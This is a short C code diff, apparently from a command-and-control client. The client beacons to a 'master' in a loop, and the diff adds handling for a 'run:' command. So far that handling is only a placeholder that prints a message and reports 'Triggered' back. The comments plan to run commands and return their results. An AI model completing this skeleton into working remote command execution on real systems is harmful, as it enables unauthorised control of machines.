@@ -4,6 +4,7 @@
 
 int main(int argc, char **argv){
     struct sockaddr_in master;
+    char *data = NULL;
     master_init(&master);
     while ( 1 ) {
         #ifdef CLIENT_DEBUG
@@ -28,7 +29,15 @@ int main(int argc, char **argv){
         // if command
             // run command
             // save results to be sent back on next beacon
-        char *resp = master_checkin(master, NULL);
+        char *resp = master_checkin(master, data);
+        if (data)
+            free(data);
+        data = NULL;
+        if (!strncmp(resp, "run:", 4)){
+            puts("Run command here");
+            data = (char*)malloc(strlen("Triggered")+1);
+            strcpy(data, "Triggered");
+        }
         free(resp);
     }
     return 0;
